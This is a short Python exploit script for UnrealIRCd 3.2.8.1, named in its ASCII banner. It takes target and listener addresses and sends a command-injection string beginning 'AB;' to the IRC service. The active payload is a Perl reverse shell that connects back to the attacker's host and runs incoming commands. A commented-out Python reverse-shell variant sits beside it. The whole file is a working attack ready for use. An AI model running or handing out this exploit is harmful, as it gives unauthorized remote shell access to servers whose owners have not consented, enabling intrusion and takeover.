# Import modules.
import argparse
import socket
import subprocess
import os

# ASCII banner.
banner = '''
 _  _  __ _  ____  ____   __   __     __   ____   ___  ____        ____        ____        ____         __         ____   ___  ____ 
/ )( \(  ( \(  _ \(  __) / _\ (  )   (  ) (  _ \ / __)(    \      ( __ \      (___ \      / _  \       /  \       (  _ \ / __)(  __)
) \/ (/    / )   / ) _) /    \/ (_/\  )(   )   /( (__  ) D (       (__ (  _    / __/  _   ) _  (  _   (_/ /        )   /( (__  ) _) 
\____/\_)__)(__\_)(____)\_/\_/\____/ (__) (__\_) \___)(____/      (____/ (_)  (____) (_)  \____/ (_)   (__)       (__\_) \___)(____)                                                                                                 

Author: KPD
'''
print(banner)

# Set up the argument parser.
parser = argparse.ArgumentParser()
parser.add_argument("rhost", help="Enter the target IP address.")
parser.add_argument("rport", help="Enter the target port number.", type=int)
parser.add_argument("lhost", help="Enter the local IP address.")
parser.add_argument("lport", help="Enter the local port number.", type=int)

# Parse the command-line arguments.
args = parser.parse_args()

# Extract the values from the arguments.
rhost = args.rhost
rport = args.rport
lhost = args.lhost
lport = args.lport

# Create the socket and connect to the target.
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((rhost, rport))
    data = s.recv(1024)
    
    # Python payload only connects back to the attacker. Shell is not interactive.
    #payload = f"AB;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    
    # Perl payload connects back to the attacker and spawns an interactive shell.
    payload = "AB;perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"" + lhost + ":" + str(lport) + "\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"
    
    # Send the encoded payload to the target.
    s.sendall(payload.encode())

# Handle exceptions.
except ConnectionError as e:
    print(f"Error connecting to the target: {e}")
except Exception as e:
    print(f"Error sending payload: {e}")
finally:
    s.close()
